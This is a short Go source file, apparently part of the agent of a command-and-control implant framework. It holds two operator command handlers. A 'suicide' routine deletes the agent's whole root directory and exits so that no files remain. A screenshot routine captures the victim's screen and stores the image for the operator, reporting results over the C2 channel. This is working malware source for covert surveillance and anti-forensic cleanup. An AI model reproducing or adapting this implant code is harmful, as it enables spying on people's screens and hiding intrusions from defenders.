package agent

import (
	"log"
	"os"

	"github.com/spf13/cobra"
)

// suicideCmdRun deletes agent files and exits.
func suicideCmdRun(cmd *cobra.Command, args []string) {
	if len(args) != 0 {
		C2RespPrintf(cmd, "args error: %v", args)
		return
	}
	if err := os.RemoveAll(RuntimeConfig.AgentRoot); err != nil {
		C2RespPrintf(cmd, "Failed to cleanup files: %v", err)
	} else {
		C2RespPrintf(cmd, "Cleanup successful, exiting")
	}
	log.Println("Exiting...")
	os.Exit(0)
}

// screenshotCmdRun takes a screenshot and returns its path.
func screenshotCmdRun(cmd *cobra.Command, args []string) {
	out, err := Screenshot()
	if err != nil || out == "" {
		C2RespPrintf(cmd, "Error: failed to take screenshot: %v", err)
		return
	}
	// Move file to agent's root directory.
	newPath := RuntimeConfig.AgentRoot + "/" + out
	if err := os.Rename(out, newPath); err != nil {
		log.Printf("screenshot rename error: %v", err)
		C2RespPrintf(cmd, "screenshot rename error: %v", err)
		return
	}
	C2RespPrintf(cmd, "%s", newPath)
}
